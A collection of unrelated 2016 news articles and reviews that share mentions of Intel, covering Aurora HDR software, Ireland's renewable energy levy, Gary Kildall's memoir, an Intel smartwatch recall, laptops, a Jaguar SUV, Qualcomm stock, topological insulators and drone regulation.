from Olympus, Sony, Canon and Fujifilm, mixing it between full-frame, APS-C, Four Thirds and compact camera sensors in order to get a well-rounded user experience. I also tried using single exposures and bracketed exposures, as well as a mix of raw and JPEG files. The first thing that bugged me was that even when using a camera with a lot of dynamic range – meaning there is lots of information in the shadow areas – Aurora HDR Professional pushes it so hard that an awful lot of noise is introduced to the shadow areas. The Denoise tool tries to combat this but tends to smudge a lot of the finer detail. If you’re planning to print the image, that level of processing really has an adverse effect on the final image quality. Next, I found that certain colours become intensely oversaturated to the point that they become a glaring distraction. Inside the tools menu there are options to turn this down, but even when corrected it seems like there’s a lot of colour depth that becomes lost. It becomes rather difficult to get the aesthetics of  an image right. The range of tools and the layout of the software are great. Everything is laid out well and is easy to find. Sliders are a tried-and-tested way to edit. I found it really easy to use and there’s plenty of support and learning material. Changing settings was easy enough, although it does make you wait for a while to see what’s going on, especially with bigger files. A single adjustment can take three or four seconds to render, so it’s not especially quick like Photoshop, which usually updates in real time. Verdict Even with a lot of tweaking, the bright yellow areas and red flowers in the foreground of the image are distracting I will start by saying I don’t like the overbaked HDR look, but I will cast aside my opinions for an honest and untarnished verdict. I find in many cases that Aurora HDR Professional introduces a lot of technical flaws into your image. In many cases, the software achieves a really punchy image with strong contrast, lots of detail loss and lots of oversaturated areas. There are image-noise issues in overworked shadows, too. I find the presets are seriously overdone. They can work wonderfully, but only on very specific images. With software such as Adobe Lightroom I can usually import a reasonably average shot and make something half decent with a few of my presets. With Aurora HDR Professional you really have to start with an incredibly strong composition and image in order to convincingly carry off the extensive editing that it goes through. Sometimes I imported an image into Aurora HDR Professional, tweaked a few presets and came back with something that was much better than the original, but the success rate certainly wasn’t as high as I was expecting. All in all, Aurora HDR Professional isn’t a bad piece of software. It’s a little sluggish and it isn’t the one-stop shop for instantly amazing pictures at two clicks of a mouse that it’s made out to be. But it’s well laid out, intuitive and you get a lot of software for £72.

X Government feels the heat as cost of supporting renewable energy jumps Latest rise in the levy to support renewables is considered a ‘rate shock’ by some in industry Fri, Aug 5, 2016, 06:30 Updated: Fri, Aug 5, 2016, 11:37 Barry O'Halloran Wind energy: one of the biggest beneficiaries from the rise in the Public Service Obligation. Photograph: EPA/JENS BUETTNER         The Government is facing growing pressure to end a costly system of supports for the renewable energy industry that has drawn criticism from some major employers in the Republic, including Kerry Group and multinationals Microsoft and Intel. From next October, all homes and businesses in the State will be faced with an increase in their electricity bills when the Commission for Energy Regulation (CER) raises its public service charge by €76 million to €400 million to cover the growing cost of supports for the wind industry. The extra charge, called the Public Service Obligation (PSO), is levied on all electricity users in the Republic. The cash raised supports wind power, other renewable energy and peat-fired electricity generators. As a result, the €400 million raised will be passed on to companies operating these plants, including State-owned ESB and rivals SSE Airtricity and Viridian. Government policy supports the development of renewable energy through a number of schemes, which guarantee prices to wind farms and other companies that generate electricity from “green” sources. This is because, under EU directive, the State has to ensure that 16 per cent of all energy needs are met from renewables by 2020. To achieve that, 40 per cent of electricity has to come from these sources. Failure to meet the targets could result in heavy fines. The charge is underpinned by legislation and the CER renews it every October following a consultation with the industry and those that are going to have to pay it. Barring 2015, when the PSO dipped, the commission has increased it every year since 2011. Figures show that the levy due to be imposed from next October is more than four times the €92 million collected under the scheme in 2011. Two things drove this year’s increase. First, the charge is designed to bridge the gap between the actual wholesale cost of electricity and the prices guaranteed to the generators. Thus, as the fall in oil and natural gas prices drove down the wholesale price, the PSO rose. ADVERTISEMENT The second factor is the growth of the renewable sector. Companies generating electricity from “green” sources, the bulk of which are wind farm operators, are always the biggest beneficiaries, thanks to the schemes that underwrite the prices that they are paid for the energy that they produce. Overall, they will share €277 million of the €400 million total collected from consumers and business over the 12 months from October. This compares with €181 million under the current levy. Of this, the wind industry will receive €269.7 million. According to the commission, this is down to the rate at which the industry grew over the last year. “An estimated 2,814 mega watts (MW) of renewable generation, mostly wind, will be supported by the PSO next year. This is 694MW, or 33 per cent, more than the 2,120 MW supported in the current PSO period, hence driving up the levy,” the regulator states in a document detailing the increase. Net result The net result of this will be that everyone will have to pay more for their electricity from next October. The charge imposed on each home will rise to €6.02 a month from €5.01. The cost over 12 months will be €72.28, 20 per cent more than its current level of €60.09. The CER’s figures show that businesses will pay more than €253 million of the €400 million total. Small firms will have €21.18 a month added to their bills from October – 18.5 per cent more than what they pay at the moment. They will each pay a total of €254.16 towards the public service obligation over the 12-month period. Their overall share of the €400 million will come to €42.6 million. Wind firms defend €270m support added to electricity bills Electricity bills to rise as regulator increases PSO charge Medium and large-scale electricity users are in for the biggest hit. They will pay a total of €210.95 million between them over the 12-month period. This group includes major employers, including those in key areas for the Republic such as food processing, pharmaceuticals and technology, as well as large public service organisations such as hospitals. Their overall share of the burden will rise by 23.5 per cent. There is no monthly breakdown of what they will pay as, in their case, the charge is tied to capacity – that is the physical amount of power they are likely to use each month. A number of big companies argue that allocating the charge in this way is unfair. In a submission to the CER before it arrived at its final decision, tech giant Microsoft, which employs 1,200 people in the Republic, said this penalises large energy users who are holding energy capacity in reserve to meet anticipated growth. The multinational also points out that the rate at which the PSO has increased over the last five years represents a “rate shock” for large energy users and “puts the Ireland energy market at a disadvantage”. In a similar vein, Irish food and ingredients giant, Kerry, which employs 4,000 people here, warns that the charge will damage its competitiveness. “Much of our business needs to compete in non-Irish, and in many cases, global markets. These are not costs which will be levied on our non-Irish competitors,” says senior manager Garvan Sweeney. “Many of our international competitors will benefit from a decrease in wholesale electricity costs without a corresponding rise in PSO.” Below average While the Republic’s electricity costs are perceived to be high, the latest assessment from the National Competitiveness Council says they are slightly below the EU average for both small and large businesses. However, Intel’s director of global utilities and infrastructure, Marty Sedler, argues that the PSO threatens this advantage. ADVERTISEMENT He acknowledges that recent falls in natural gas prices, which have a knock-on impact on electricity, improved the Republic’s competitiveness but warns that the way in which the PSO is implemented negates this. “The latest proposal is an approximate 36 per cent increase to 2016/17 which is well out of the range of manageability and [is] considered a rate shock,” he says. Along with the high-profile names, a large number of quarries and cement manufacturers also warn about the impact of another PSO increase. Those businesses need large amounts of electricity. One, Frank Harrington of Harrington Concrete and Quarries in Sligo, points out that his industry has shrunk by 70 per cent over the last number of years, shedding jobs in the process. “I earnestly encourage the CER to recognise the fact that the high cost of the electricity, and in particular the PSO element, is detrimental to the sustainability and growth of business in a still very fragile environment,” he says. All submissions are a response to the CER’s original proposal to increase the charge to €440 million. The regulator cut back on this, but businesses still maintain that the actual increase is going too far. While the levy imposed on consumers looks small, leading charity St Vincent de Paul says that it will hit vulnerable households. The organisation points out that the unintended consequence of the levy is that it increases the burden on low-income customers and those with a history of arrears and debts. “To this extent, the PSO can be viewed as a regressive tax,” the charity argues. Its submission states that the increase will eat into gains from recent falls in energy prices. For its part, the wind lobby maintains that it actually cuts electricity prices. The Irish Wind Energy Association says that a recent report, based on figures from the national grid operator, Eirgrid, shows that wind drove down wholesale prices by 26 per cent in the first half of this year. The association argues that this offsets what consumers pay to support the industry under the PSO. The CER acknowledges all the arguments, but says that the PSO is Government policy, designed to promote renewable generation and indigenous fuels – that is, peat – and to support energy security. It explains that it cannot abolish the charge. “Furthermore, the CER does not have discretion regarding the magnitude of the PSO levy, as the CER calculates the PSO levy in accordance with the governing legislation,” it says. “Consequently, any issues pertaining to PSO legislation, PSO policy and associated terms and conditions are a matter for Government policy and outside the remit of the CER.” The Department of Communications, Energy and Natural Resources claims the scheme is one of the cheapest in th EU and is vital to enable the Republic to meet its renewable energy targets. “The Government has no plans to end the PSO in the foreseeable future,” it says. According to Neil Walker, director of employers’ group, Ibec, the Government is likely to have to get to grips with the issue in coming weeks. One of the schemes supported by the PSO, known as Renewable Energy Feed-in Tariff (REFIT) 2, closed at the end of last year. This means that any green energy projects built after that date will not benefit from the scheme. As a result, the renewable industry is already lobbying for a replacement. Walker expects that a formal consultation could begin in the autumn. His organisation fears that its outcome could leave businesses and consumers facing even more dramatic increases in the charge. Walker acknowledges that onshore wind is the most efficient and cheapest form of renewable energy currently available. However, the proliferation of wind turbines around the country has sparked a public backlash. ADVERTISEMENT Walker suggests this may prompt the Government to introduce supports for more expensive technology, with an inevitable impact on the levy. “That could lead to a trebling or quadrupling of the PSO,” he warns. The department confirms that there will be a consultation, once its staff have completed a detailed economic analysis of proposals for a new support scheme that the Government hopes to introduce next year – assuming it gets state aid clearance from the EU. This could involve either a new feed-in tariff, similar to REFIT, or a grant. Some sources have indicated that officials are also considering an auction-type system, which should in theory favour the cheaper and more efficient suppliers. “Therefore, consideration of this new policy measure to be funded by a PSO levy is being preceded by robust analysis and a full evaluation of the available technologies, their cost effectiveness, the level of support required and careful consideration of impacts,” the department says.       Topics: Frank Harrington Marty Sedler Neil Walker Sweeney Garvan Commission For Energy Regulation Commission for Energy Regulation Department of Communications Energy and Natural Resources ESB Eirgrid Eu Irish Business and Employers Confederation Irish Wind Energy Association National Competitiveness Council Society of Saint Vincent De Paul Airtricity Intel Kerry Group Microsoft Renewable Energy State Owned Brussels Ireland Sligeach Read More John FitzGerald: Greater accuracy on national accounts vital for budgeting Caveat: Deirdre Foley has brought Clerys opprobrium on her own head Subscribe.   More from The Irish Times Financial Services 1:10 First-time buyer deposits cut to 10% as Central Bank eases mortgage rules Technology Clever cube makes for easier shared viewing English Soccer Ex-England player David White reveals sexual abuse by coach Economy Always-on world making people happier, survey claims Sponsored A bank-beating foreign exchange proposition How ‘nudge theory’ can improve pension provision Black Friday: what is it and how to prepare for it Send an AdMailer Christmas card and help a homeless charity ADVERTISEMENT ADVERTISEMENT Commenting on The Irish Times has changed.

The world’s largest maker of computer chips, eager to diversify beyond the fading PC market, acquired Basis Science in 2014. Reports pegged the price between $100 million and $150 million. Intel warned owners in June that it had received reports the Basis Peak watches were overheating and recommended people stop wearing them. The company said it hoped to solve the problem with a software fix but couldn’t find one. Intel promised buyers a full refund, and Walden apologized for the company’s inability to find a better solution.

He isn't as well known as the other computer creators of his generation but now the Computer History Museum has made available for download part of the draft he had intended as the basis of a book.   Gary Kildall (1942-1994) Gary Kildall, the creator of the CP/M operating system, died unexpectedly in 1994, at the young age of 52. having never published an autobiography. He had, however, distributed copies of a Christmas, 1993 Edition of a memoir titled “Computer Connections: People, Places, and Events in the Evolution of the Personal Computer Industry” to family and friends, noting that it would "go to print  in final form early next year, apparently under the auspices of Osborne-McGraw Hill".  Ownership of that manuscript passed to Gary’s children, Scott and Kristin who have now given permission for the Computer History Museum to make the first portion publicly available along with previously unpublished family photos.  In their introduction Scott and Kristin Kildall write: “Our father, Gary Kildall, was one of the founders of the personal computer industry, but you probably don’t know his name. Those who have heard of him may recall the myth that he “missed” the opportunity to become Bill Gates by going flying instead of meeting with IBM. Unfortunately, this tall tale paints Gary as a “could-have-been”, ignores his deep contributions, and overshadows his role as an inventor of key technologies that define how computer platforms run today. Gary viewed computers as learning tools rather than profit engines. His career choices reflect a different definition of success, where innovation means sharing ideas, letting passion drive your work and making source code available for others to build upon. His work ethic during the 1970s resembles that of the open-source community today. With this perspective, we offer a portion of our father’s unpublished memoirs so that you can read about his experiences and reflections on the early days of the computer industry, directly in his own voice. The excerpt consists of the first seven chapters of the memoir, 78 pages in all documenting his early experience with computers while at the University of Washington, through his time as a professor at the Naval Postgraduate School and as a consultant for Intel and creating PL/M - Programming Language for Microcomputers, a breahthrough which used compiler technology up to the early days of Digital Research (DR), the start up he established with his wife, Dorothy.     A chapter is devoted to CP/M and in the next one we learn how lasting contribution to computer technology came about due to Glenn Ewing, one of Kildall's graduate student's needing to produce a disk operating system in a hurry: Glenn came to my tool shed computer room in 1975, so we could "adapt" CP/M to the IMSAI hardware. What this means is that I would rewrite the parts of CP/M that manage things like diskette controllers and CRTs. Well. come on, I'd already done this so many times that the tips of my fingers were wearing thin, so I designed a general interface, which I called the BIOS (BASIC I/0 System) that a good programmer could change on the spot for their hardware. This little BIOS arrangement was the secret to the success of CP/M. With the BIOS in place, a programmer could make CP/M work with their specialized hardware. With all those hobbyists out there, believe me, there was no shortage of specialized hardware. Glenn and I built a BIOS that afternoon and stuck CP/M on an IMSAI. In a section on The Early Days of Microsoft we are given an insight into the relationship between Kildall and Bill Gates: Bill came to me in Pacific Grove one day in 1977 to discuss his current quandary about relocation of his Microsoft company. We invited him to stay that night at our home. Dorothy fixed a nice roast chicken dinner, and we had light conversation. Bill told us about the tickets he had received driving at high speed in his Porsche 911 through the main street of Albuquerque. We found a common topic since I. to my misfortune, also enjoy speed of the automotive type that sometimes, but not often, results in an encounter with The Law. At this time, I was quite friendly with Bill, and we always talked of the "synergism" of our two businesses. But, quite frankly, I was always apprehensive of his business moves, as I found his manner too abrasive and deterministic, although he mostly carried a smile through a discussion of any sort. In a later passage he wrote: Monetarily, Bill had the proper approach to get a stack of bucks, and lose a bunch of friends in the meantime. I guess that's ok. Other people discussed in the course of the excerpt include Grace Hopper, described as a "lovely lady" who: was self-proclaimed to be the first programmer, and I believe her. She was quite elderly when I met her, but wore the crisp dress uniform of the Navy each time I saw her. She helped invent COBOL, that business language used throughout the world today. She was a brightly clever, petite gray-haired lady with a wit and brain sharper at her age than most who were half her's. She was like having a charming grandmother who could talk your socks off about computers. Quite a combo, indeed. All her stories were true, captivating, and always drew a crowd.  He also liked Robert Noyce, founder of Intel: Bob Noyce was a clever, somewhat silent, gray-haired guy who mostly wore a white lab coat to cover his casual demeanor. At first, I must admit that I liked him because he was a pilot.... Bob was a friend. He, like all of us, made some decisions that are right, and some that could have made the future unfold in a different manner. But, most of all, Bob treated his people with dignity. He had the foresight to build an industry in microprocessors. I was very sad when he died recently. This portion of the memoir takes us to the end of the 70s and it doesn't give details of what caused the deal for IBM to contract DR's CP/M as one of the operating systems for the IBM PC to fall through. The apocryphal story that he was enjoying a day off flying his plane, is now seen to be an over simplified, or even falsified account, of the events. Whatever happened it had a lasting impact on the future of the software industry. Gary Kildall died after a blow to the head during a biker brawl at a bar in Monterey in 1994 so there is more of his story to tell. However it doesn't seem as though more of his memoir will be revealed. Scott and Kristen Kildall write: We have chosen to release only the first portion of his memoir. Unfortunately Gary’s passion for life also manifested in a struggle with alcoholism, and we feel that the unpublished preface and later chapters do not reflect his true self. If you want to read more about events in his later life and the further development of CP/M, They Made America by Harold Evans, Gail Buckland, and David Lefer has an excellent chapter on this topic.     You can read more about Kildall's life and contributions in Gary Kildall - CP/M, Digital Research and GEM. This 1995 video is a special edition of Computer Chronicles, a series which Kildall had co-hosted since its inception, was devoted to Gary Kildall's story. Introduced by Stewart Cheifet. it includes comments by Tom Rolander who was the first employee of Digital Research; Alan Cooper, a CP/M applications developers; as well as Gordon Eubanks and others.       More Information In His Own Words: Gary Kildall Related Articles Gary Kildall - CP/M, Digital Research and GEM IEEE Honors Gary Kildall 30 years ago - Microsoft signs contract with IBM to create MS-DOS     To be informed about new articles on I Programmer, sign up for our weekly newsletter, subscribe to the RSS feed and follow us on Twitter, Facebook, Google+ or Linkedin.   //No Comment - TDD, C++ Lambdas & Agile Under Scrutiny 09/11/2016 • Test-Driven Development • An empirical study on the impact of C++ lambdas and programmer experience • Software Quality - Traditional vs. Agile: an Empirical Investigation + Full Story PowerApps Launch 16/11/2016 Recently Microsoft discontinued LightSwitch, its almost-no-programming app creation system to replace it by PowerApps, another almost-no-programming app creation system.

SuperOp! uniquely allows companies to test that their products work seamlessly with equipment from other companies by offering a test platform of software, hardware, UC and multimedia solutions both for enterprises and service providers, running over a combined IP and 4G LTE network and using a broad range of protocols and technologies including WebRTC, Microsoft Skype4Business, SIP, TIP, H.323, H.264, SVC and HEVC/H.265. This diversity of equipment, protocols and vendors is not duplicated by any other industry event and cannot be economically undertaken by individual companies. At each SuperOp!, a SuperConnect is held to test and demonstrate interoperability across all the multimedia and UC products. This year's SuperConnect was completed in 14 minutes across 35 SIP, WebRTC and Telepresence endpoints and 14 MCUs, Gateways, Session Border Controllers and SIP servers. The IMTC WebRTC group works closely with the IMTC SIP Interconnect group focusing on interoperability between SIP and WebRTC Video conferencing applications. For the second successive year the IMTC WebRTC Activity Group was at the SuperOp! event to promote interoperability of WebRTC based applications with Video Conferencing solutions, SBCs and Audio/Video Endpoints. The companies participating in the WebRTC related testing included leading vendors from the Unified Communications industry. The IMTC WebRTC AG is also actively supporting the development of a WebRTC interoperability testing framework capable of testing both applications and browsers, which is intended to provide the basis for future WebRTC testing at SuperOp!. The SIP Interconnect Activity Group testing included 16 product teams from Blue Jeans Networks, Cisco Systems, Huawei, Intel, Pexip, Polycom, Sonus Networks, Sorenson Communications, Spirent Communications, Vidyo, and Wipro. Testing focused on key aspects of videoconferencing/telepresence interoperability, using the IMTC SIP Interconnect best practices documents and associated test cases as the framework within which to test and report results. Interworking across implementations was quite broad, extending beyond that covered within the IMTC's best practice documents, including SIP/WebRTC interworking via gateways provided by several participants. The level of interworking and the sophistication of the test scenarios was more advanced than in previous years. New interoperability issues were identified, some of which were resolved during the week with corresponding changes being fed back into the best practices and test cases documents. "This year's SuperOp! results prove that the IMTC is successfully bringing together industry leading companies from around the world, improving product performance by breaking down the technical barriers which hinder interoperability," said Anatoli Levine, IMTC President and Director of Product Management at Spirent Communications. "Our ultimate goal is to ensure that video, audio and UC clients, systems and Cloud services all work flawlessly together to provide a seamless user experience." SuperOp! 2016 also featured a half-day IoT workshop focused on using IoT in the context of Unified Communications (UC). Topics covered included use-cases and adaptation architectures, a Software Define Networking (SDN) model to interface to IoT, Sensors and APIs with UC as hubs, UC hubs interfacing to IoT infrastructure, and UC components as IoT elements. IMTC was honored to have Cisco, Polycom, Vidyo and Wipro sponsor the event.

The 14-inch convertible laptop is equipped with a revamped Wi-Fi antenna, a touchscreen display and a wireless mouse that can be used as a remote. Its 8-hour battery life is designed to make long hours of work manageable without power sockets. The Yoga 710 is host to a Wi-Fi antenna that is spread over a larger area than usual, enabling 20 percent stronger signal strength. Its combination of the 6th gen Intel Core processor and 8GB RAM should offer decent performance value along with the Windows 10 OS that’s aboard. In case you’re worried about portability, the laptop tips the scales at just 1.5kg. The Yoga 710 features the next generation Nvidia GeForce 940 MX (N16S-GTR) graphics card which should be capable of smoothly rendering games and videos. Its 1920 x 1080 FHD display spanning 14 inches would have sounded more appealing had it been a 4K one. Above the screen sits 720p HD webcam for video conferencing and what not. To add to the home theater experience is Dolby Audio Premium which adjusts audio while providing a virtual surround sound experience. All these specs come with a 256GB SSD to store movies and photos. The company claims 8-hour battery life including video playback. Lenovo provides two USB 3.0 ports on the device along with an HDMI port and an SD card reader. It also has a microphone and headphone jack. The wireless Yoga mouse doubles up as a remote control with an adaptive touch display. It is fitted with rechargeable batteries to eliminate the need for buying new ones now and again. It can be hooked up to the laptop over Bluetooth 4.0 or 2.4GHz wireless connection. Lenovo bundles in extra accessories like Bluetooth speakers and the Lenovo 500 in-ear headphones too. Let’s take a quick look at the specifications of the Lenovo Yoga 710: – OS: Windows 10 – Display: 1920 x 1080 full HD 14-inch screen – GPU: Nvidia graphics card – CPU: 6th gen Intel Core processor – Camera: 720p HD cam – Memory: 256GB SSD – RAM: 8GB – Battery: 8 hours including video playback – Connectivity: Wi-Fi, Bluetooth, USB 3.0, HDMI, SD card reader, headphone/microphone jack The Lenovo Yoga 710 is being sold in a silver color variant.

Auto review: Jaguar F-Pace is this year's must-have SUV Larry Printz, Tribune News Service Aug 5, 2016 (…) Tribune News Service The Jaguar F-Pace has a supercharged 3.0-liter V6, with either 340 or 380 horsepower. Tribune News Service The interior includes Jaguar’s InControl Touch Pro infotainment system that has a 12.3-inch widescreen satellite maps, swipe-and-pinch gestures, a 10.2-inch digital instrument cluster and 3G Wi-Fi. With the launch of the 2017 F-Pace two-row crossover, Jaguar, although a bit late to the party, has entered one of the luxury market's most competitive segments. Of course, you can understand Jaguar Land Rover's reticence to go this route. When you have Land Rovers sitting at the other end of your showrooms, why bother with an SUV? Simple, where Land Rovers are great once the concrete ends, their on-road ability is somewhat compromised by their off-road agility. So it makes sense that rather than dilute Land Rover's heritage by producing a street-warrior Rover, you would endow it with a corporate badge long-revered for its sporting moves. The vehicle certainly looks the part. It's sensuous, sinewy lines have a simplicity that is pure modern Jaguar, although the vehicle clearly shows an influence wrought by the Porsche Macan rather than any Land Rover. That's not the case inside, where you'll find a cabin trimmed in the starkly modern Jaguar idiom, trading the obvious plushness of Jags of yore for those more akin to a trendy hotel. The instrument panel is identical to the one used in the new XE compact sedan and includes an optional virtual instrument cluster that allows for a large degree of customization. The controls on the infotainment system are designed for ease of use and respond quickly, unlike those with past Jaguar systems. Credit the Intel quad core processors. The climate control buttons are separate, just below the screen. The overall effect is one of eloquent simplicity, which is the ultimate luxury. Those seated up front are treated to a generous amount of space. The seats are supportive with good side bolstering, but they do prove a bit firm over longer stints. And it would help if Jaguar would pad each side of the center console a bit more for those drivers with longer legs. But what separates the F-Pace from its competitors is the equally impressive amount of head and legroom found in the rear seat, which is a little low but not uncomfortably so. And cargo space? It's expansive considering the vehicle's footprint. The cabin's sense of grand space is enhanced by the standard panoramic sunroof. Once underway, the cabin proves to be quiet despite the growl from the F-Pace's supercharged 3.0-liter V-6, with either 340 or 380 horsepower. A new turbocharged 2.0-liter diesel engine will join the lineup shortly after launch. It's rated at 180 horsepower and 318 pound-feet of torque. All engines mate to a responsive eight-speed automatic transmission made by ZF. Being a crossover, the F-Pace does have a more compliant feel than the XE and XF sedans with which it shares its platform, but that doesn't affect handling, unless you're an asphalt Andretti. It handles far better than your typical crossover, with an ample amount of agility and athleticism. Body motions are very well controlled over rough stuff, and cornering behavior is exemplary though the twisties, remaining flat enough to impart more than a bit of driving fun. The all-wheel-drive system employs rear-wheel drive unless traction is needed, but unlike some competitors, it doesn't have torque vectoring. That and the lack of run-flat tires give it a personality lacking on its German competition. Steering is quick, if a little light. An off-road cruise control system, similar to the Land Rover system, works well in milder off-road situations. But it's designed for the unpaved trail to your country cottage rather than for heavy duty boulder bashing. The F-Pace is offered in base, Premium, Prestige, and R-Sport trim. A $1,000 Adaptive Dynamics package, offered on the Prestige and R-Sport, allows drivers to customize the engine, transmission, steering and suspension settings. As you might expect, Dynamic mode is heaps of fun until the road deteriorates, whereupon Normal will become a mode of choice. Of course, when not listening to the marvelous engine notes you could listen to the optional Meridian audio system whose delicious sound is a feast for the ears. Throw in a generous 5-year, 60,000-mile warranty and a price that starts at $40,990, and what you end up with is the must-have SUV of the year. No doubt this cat is the pick of the litter in its class, the one you must test drive if you're looking for a luxury sport utility vehicle. It will leave you purring.

I have been bullish on the stock ever since it was trading around $45, and the stock has shot up almost 35% in the reference time period.  Despite the strong appreciation, I think Qualcomm still has more upside to offer because it released strong quarterly earnings last month. Qualcomm shared strong third quarter results, as the company reported EPS of $1.16, $0.19 greater than the estimate. On the other hand, the company’s revenue surged 3.4 percent year over year to $6.03 billion, beating the consensus by $450 million. In addition, the company also guided for a strong quarter. Qualcomm faced some problems in the previous year due to the failure of its Snapdragon 810 processor. Due to this reason, Samsung excluded Snapdragon 810 processor from its flagship phones Galaxy S6/S6 Edge. Later, the company solved this issue by developing a new and upgraded processor “Snapdragon 820”. This new processor was much efficient compared to its prior version and was free from overheating issues. After the launch of Snapdragon 820, Samsung used the processor for some models of its latest flagship Galaxy S7/S7 Edge. Moreover, Snapdragon 820 was also installed in many other smartphones. Samsung has also decided to use Qualcomm’s low-end Snapdragon processors for its less expensive smartphones. Currently, Qualcomm and Intel account for the two dominant players of the industry. It looks like both the companies have similar valuations and pay dividends to stockholders, but deep inside, their businesses are moving in the different directions. However, it can be said that Qualcomm is performing better than Intel, as the company has made noteworthy progress in its own turnaround and its future prospects look good as well. Qualcomm’s revenue surged 4 percent in the prior quarter, but revenue escalated 9 percent from the prior quarter. Moreover, Qualcomm is excellently placing itself to take advantage from the growth of areas of the business, precisely connectivity and 5G. In the case of mobile, the Snapdragon processor is now used by around 150 premium smartphone and tablet designs. Apart from these, Snapdragon processor is also poised to make its way in the virtual reality market, one more promising future growth catalyst. All in all, there are still many opportunities left for Qualcomm in different segments such as automotive, networking, and Internet of Things, which is why I am still bullish on the stock going forward Published on Aug 5, 2016 By Prudent Investor Copyrighted 2016.

Alan Rios, Geek Squad technology education agent at Best Buy at Bunker Hill, is an expert when it comes to back-to-school gadgets. This year's picks for some of the newest equipment available is at www.bestbuy.com/site/Global/College-Student-Deals. On the top of the list for the school year are innovative laptops. These include the Dell Inspiron 7000, priced at $699, and the HP Spectre 13 available for $1,149. The appeal for both of these is their versatility. The Dell, armed with a touch screen, has a 13.3-inch display that's backlit to reduce eye fatigue. Dell's Intel HD graphics are optimal for viewing videos and participating in online games. Another enjoyable feature is the Bluetooth 4.2 interface and built in WiFi. "I really like that its really good entry-level computer at not a really high price point with a solid state hard drive," Rios said. "It's a whole lot faster with no moving parts less likely to fail. It has the 2-in-1 laptop mode with a screen that folds backward to turn into a tablet. It can do presentation mode." The HP Spectre 13 is one of Rios' personal favorites for numerous reasons. Also a 2-in-1, this laptop has an aluminum finish and a vivid HD touch screen. An external device is easily connected via Bluetooth for simple streaming. "The aluminum finish makes it feel more premium. The biggest difference is the quality HD display that is almost three times as many pixels, and three times better than what we're used to. It's a much clearer, crisper screen, and also significantly lighter for a laptop," Rios said. A printer is also essential, for assignments, projects and papers. Rios' selection is the new Epson XP430 priced at $59. Users print wirelessly with this all-in-one printer without a network and send print jobs from any smartphone or tablet. "It's really good for a student," Rios said. "What I like about it is the screen to see all the settings. It's easy to use." Students can ease into their study zone with the headphones designed for the best experience possible. Rios favors the Bose QuietComfort 35 for $349 and Jaybird Freedom wireless headphones for $199. Each has their own exceptional qualities with world-class noise cancellation, Bluetooth capabilities and long battery life. "The Bose headphones are very comfortable. I recommend them for power studying. They're a little pricey, but there's a lot of technology in them. Jaybird is really light and great for working out and studying," he said. Staying on top of your game physically is also important. The way to do that is to have uniquely designed health-tracking devices with maximum efficiency. Rio's picks are the Samsung Gear Fit 2 at $179 and the Fitbit Blaze for $184. Features include the measurement of heart rate, calories burned, distance traveled, steps taken and speed. The Samsung also has Bluetooth 4.2 interface to sync results with a Samsung tablet or phone. The Fitbit Blaze utilizes SmartTrack and comes with a GPS to use in real time.

Cantech Letter The Very Best of Canadian Science and Technology Home About Us Archive Currently Trending Cantech Investment Conference ||| ||| Wireless Interviews Software Lists and Data Cleantech Life Sciences Hardware Gaming Opinion Science Fintech Discovery of a new form of light will have “huge impact”, say scientists August 5, 2016 By Jayson MacLean Leave a Comment Share this: Twitter0 Google+0 Facebook24 Physicists at Imperial College London have discovered a new property of light; its ability to interact with single electrons in what are known as topological insulators. The finding is thought to have applications for computer circuitry, potentially creating even more microscopic, fast and reliable electronic circuits. Researchers studying the properties of topological insulators -super-thin materials that can conduct electricity regardless of minute imperfections or deformations in the shape of the material- found that light can be made to interact with a single electron on the surface of a topological insulator. This phenomenon effectively ties together the light particle (photon) and electron such that the electron adopts properties of the photon and the photon takes on properties of the electron. In terms of practical implications, this means that the light particle can be made to follow a path along a substrate such as a circuit board much like an electron does. “The results of this research will have a huge impact on the way we conceive light,” says Dr. Vincenzo Giannini, professor of physics at Imperial College London and co-author of the study. “Topological insulators were only discovered in the last decade, but are already providing us with new phenomena to study and new ways to explore important concepts in physics.” The new discovery may help pave the way for quantum computing to become a reality, as well as allow for further reduction in the already minuscule size of computer chips. The death of Moore’s Law of computing has been forecasted many times over the past half-century, but it has been only recently that tech giants and chip makers have assented to the fact that the pace of advances in chip technology has now slowed considerably, putting pressure on researchers to come up with a brand new approach to computing. _____________________________________________________________________________________________________ This article is brought to you by TrackX (TSXV:TKX), a global leader in asset tracking. Click here to learn more. ______________________________________________________________________________________________________ In 1965, co-founder of chip giant Intel, Gordon Moore, first observed and proclaimed the computer industry truism -since known as Moore’s Law- that the number of components on an integrated circuit would double every year, essentially shrinking machine size while creating an annual doubling of computing power. The principle more-or-less held for decades, as semi-conductors went from the warehouse-sized antiquities of the 1950s and 60s to the 4004 microprocessor created by Intel in 1971, containing at the time a record number 2,300 transistors, to today’s computer chips that have literally billions of transistors. Yet, researchers now find themselves bumping up against the physical limitations of matter. Hence the promise of quantum computing and a radical shift in the idea of how to build a computer. Companies such as D-Wave based in Burnaby, BC, are already launching designs -the D-Wave 2X, for example- that are moving computing away from semiconductor technology and towards quantum computing. The sea change has been observed by even the international groupings of chip technology giants, the Semiconductor Industry Associations, who together have decided to create a new forecasting system for computing technology called the International Roadmap for Devices and Systems, which will look at technologies that go beyond that of the semiconductor. “The end of Moore’s Law is what led to this,” says Thomas M. Conte, computer scientist at the Georgia Institute of Technology and co-chairman of the effort to create the new Roadmap. “Just relying on the semiconductor industry is no longer enough. We have to shift and punch through some walls and break through some barriers.” The new study is published in the journal Nature Communications.

Michael Hiltzik Columnist BUSINESS Michael Hiltzik Column California struggles to lead the way on drone regulation encounters Bard College Sightings and close encounters based on FAA data from late 2014 to mid-2015 involving aircraft landing at LAX and drones, which in almost every case were being operated illegally. Sightings and close encounters based on FAA data from late 2014 to mid-2015 involving aircraft landing at LAX and drones, which in almost every case were being operated illegally. (Bard College) Michael Hiltzik Most Californians have probably never heard of DJI Technology, but legislators in Sacramento are hearing its message. Over the last year, the company has sharply ramped up its spending on lobbying in the state capital, moving from zero in the third quarter of 2015 to $155,000 since then. It’s also spending about $200,000 on lobbying in Washington. It’s the largest manufacturer of drones. They’re those buzzy, compact remote-controlled aircraft that have become all the rage among hobbyists and are being eyed by industry and government agencies to perform work that’s too costly, dangerous, or difficult for humans, including the prompt delivery of merchandise, inspection of remote facilities, filming, firefighting and police surveillance. The drone industry emphasizes the potential for expanding the use of unmanned aircraft in arguing for measured regulation or self-regulation.  The overarching themes of these bills are safety, security and privacy. — Drone law expert Steven D. Miller Fans and critics of drones alike expect the skies to become very crowded in coming years, as the devices become cheaper and acquire greater capabilities. Shenzhen, China-based DJI, which is reported to command as much as 70% of the drone market, sells its camera-equipped products today for prices ranging from $6,500 to less than $500.  